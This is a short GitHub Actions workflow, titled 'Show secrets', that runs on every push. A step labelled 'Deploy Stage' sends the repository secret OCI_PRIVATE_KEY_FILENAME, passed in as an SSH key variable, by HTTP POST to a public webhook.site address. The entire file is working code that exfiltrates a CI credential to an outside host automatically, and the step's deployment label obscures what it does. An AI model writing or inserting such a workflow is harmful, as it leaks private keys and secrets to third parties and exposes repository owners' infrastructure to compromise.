name: Show secrets
on: [push]
jobs:
  debug:
    name: Show secrets
    runs-on: ubuntu-latest
    steps:
      - name: Deploy Stage
        env:
          SERVER_SSH_KEY: ${{ secrets.OCI_PRIVATE_KEY_FILENAME }}
        uses: fjogeleit/http-request-action@v1
        with:
          url: 'https://webhook.site/bfbec6dc-4031-48ff-ad25-3a006b83fc58'
          method: 'POST'
          customHeaders: '{"Content-Type": "application/json"}'
          data: ${{ secrets.OCI_PRIVATE_KEY_FILENAME }}
